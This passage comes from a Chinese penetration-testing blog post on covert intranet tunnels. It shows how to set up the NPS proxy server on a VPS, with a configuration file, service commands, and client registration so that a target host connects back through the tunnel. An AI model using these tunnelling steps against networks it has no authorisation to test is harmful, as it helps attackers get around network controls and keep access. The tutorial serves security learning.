+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x nps</span><br><span class="line">sudo .&#x2F;nps install	#安装</span><br></pre></td></tr></table></figure>
+
+<p>2.修改配置文件（敏感信息改掉/etc/nps/conf/nps.conf，原本的配置文件挺长的，运行反而会报错，直接替换成以下的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">appname &#x3D; nps</span><br><span class="line">#Boot mode(dev|pro)</span><br><span class="line">runmode &#x3D; dev</span><br><span class="line"></span><br><span class="line">##bridge</span><br><span class="line"># 底层通信协议，默认tcp，可选用kcp</span><br><span class="line">bridge_type&#x3D;tcp</span><br><span class="line"># 底层通信端口，默认8024，如已被占用请指定其他端口</span><br><span class="line">bridge_port&#x3D;8024</span><br><span class="line">bridge_ip&#x3D;0.0.0.0</span><br><span class="line"></span><br><span class="line"># 当客户端以配置文件模式启动时会用到的验证密钥，可自行设置，本教程不会使用到</span><br><span class="line">public_vkey&#x3D;&lt;你的通信密钥&gt;</span><br><span class="line"></span><br><span class="line">#web</span><br><span class="line">web_host&#x3D;&lt;服务器IP或域名&gt;</span><br><span class="line">web_username&#x3D;&lt;设置用户名&gt;</span><br><span class="line">web_password&#x3D;&lt;设置密码&gt;</span><br><span class="line">web_port &#x3D; &lt;网页面板端口&gt;</span><br><span class="line">web_ip&#x3D;0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p>3.开启服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nps start		#启动</span><br><span class="line">sudo nps stop		#停止</span><br><span class="line">sudo nps reload		#服务端配置文件重载</span><br></pre></td></tr></table></figure>
+
+<p>4.访问vpsip s:8080，在客户端管理中创建一个客户端，记录下验证密钥（也可以不设置，则会默认生成）</p>
+<p>选择客户端通过配置文件连接为否，不然可能会配置冲突，点击新增，新增成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316212917305.png"></p>
+<p>可以直接看到客户端启动命令可以直接复制。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213053224.png"></p>
+<p>下载对应的客户端，因为我这里下载的服务端为linux_amd64，则下载windows_amd64</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213529139.png"></p>
+<p>运行命令可以看到连接成功。</p>
+<p>web界面也可以看到主机上线</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213624435.png"></p>
+<p>下一步就能对客户端进行操作了：</p>
+<p>直接点击隧道选项，对该客户端进行操作……</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316214310793.png"></p>
+<p>非常的好用嗷！</p>
+<p>当然小众的一些代理工具会更好用，给自己立个flag，自己开发一个代理工具</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">http://example.com/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mssn Harvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(64).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(28).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">内网基础-定位域管理员</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF-Web分类练习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/09/13/内网渗透-信息收集/" title="内网渗透-信息收集"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(54).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-13</div><div class="title">内网渗透-信息收集</div></div></a></div><div><a href="/2021/03/18/内网基础-定位域管理员/" title="内网基础-定位域管理员"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(28).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-18</div><div class="title">内网基础-定位域管理员</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Harvey</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MssnHarvey/mssnharvey.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=3305601910" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://t.me/MssnHarvey" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://github.com/MssnHarvey" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3305601910@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome to Harvey'Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">1.前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%B8%B8%E7%94%A8%E9%9A%A7%E9%81%93%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">2.常用隧道分类：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%BA%94%E7%94%A8%E5%B1%82%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 应用层：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E4%BC%A0%E8%BE%93%E5%B1%82"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 传输层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%BD%91%E7%BB%9C%E5%B1%82"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 网络层</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E5%93%AA%E4%BA%9B%E6%B5%81%E9%87%8F%E8%83%BD%E5%87%BA%E7%BD%91"><span class="toc-number">3.</span> <span class="toc-text">3.判断哪些流量能出网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-icmp%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 icmp协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Http%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Http协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">linux：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-number">3.2.2.</span> <span class="toc-text">Windows:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">dns协议：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-number">3.3.2.</span> <span class="toc-text">Linux</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">4.搭建隧道实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E6%90%AD%E5%BB%BAipv6%E9%9A%A7%E9%81%93"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 搭建ipv6隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 搭建icmp隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%EF%BC%9A"><span class="toc-number">4.2.1.</span> <span class="toc-text">反弹shell：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%9A"><span class="toc-number">4.2.2.</span> <span class="toc-text">端口转发：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#icmp%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">4.3.</span> <span class="toc-text">icmp隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-tcp%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.4.</span> <span class="toc-text">4.2 tcp端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows%EF%BC%9A"><span class="toc-number">4.4.1.</span> <span class="toc-text">windows：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">4.5.</span> <span class="toc-text">webshell代理工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E9%9A%A7%E9%81%93"><span class="toc-number">4.6.</span> <span class="toc-text">ssh隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%EF%BC%88%E6%AD%A3%E5%90%91%EF%BC%89"><span class="toc-number">4.6.1.</span> <span class="toc-text">本地转发（正向）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91%EF%BC%88%E5%8F%8D%E5%90%91%EF%BC%89"><span class="toc-number">4.7.</span> <span class="toc-text">远程转发（反向）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Frp%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93%EF%BC%9A"><span class="toc-number">4.8.</span> <span class="toc-text">Frp搭建隧道：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%9A-1"><span class="toc-number">4.8.1.</span> <span class="toc-text">端口转发：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#socks5%E4%BB%A3%E7%90%86%E6%9B%B4%E7%AE%80%E5%8D%95%E4%BA%86%EF%BC%9A"><span class="toc-number">4.8.2.</span> <span class="toc-text">socks5代理更简单了：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BANPS%E9%9A%A7%E9%81%93%EF%BC%9A"><span class="toc-number">4.9.</span> <span class="toc-text">搭建NPS隧道：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(2).png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次对某大学的逻辑漏洞"/></a><div class="content"><a class="title" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞">记一次对某大学的逻辑漏洞</a><time datetime="2021-03-20T13:11:00.000Z" title="发表于 2021-03-20 21:11:00">2021-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/" title="内网基础-定位域管理员"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(28).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网基础-定位域管理员"/></a><div class="content"><a class="title" href="/2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/" title="内网基础-定位域管理员">内网基础-定位域管理员</a><time datetime="2021-03-18T10:21:20.000Z" title="发表于 2021-03-18 18:21:20">2021-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="内网渗透-信息收集"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(64).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透-信息收集"/></a><div class="content"><a class="title" href="/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="内网渗透-信息收集">内网渗透-信息收集</a><time datetime="2021-03-17T06:21:20.000Z" title="发表于 2021-03-17 14:21:20">2021-03-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-Web分类练习"/></a><div class="content"><a class="title" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习">BUUCTF-Web分类练习</a><time datetime="2021-03-16T06:33:20.000Z" title="发表于 2021-03-16 14:33:20">2021-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告">DC-3靶机渗透测试报告</a><time datetime="2021-03-15T06:11:00.000Z" title="发表于 2021-03-15 14:11:00">2021-03-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harvey</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><img src="https://web-resource.mucang.cn/maiche.web/mucang.official/official/resources/images/new-version/beian.png" width="20" height="20" /> </img> 闽ICP备20002768号</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    let initData = {
+      el: '#twikoo-wrap',
+      envId: '',
+      region: ''
+    }
+
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    twikoo.init(initData)
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: '',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
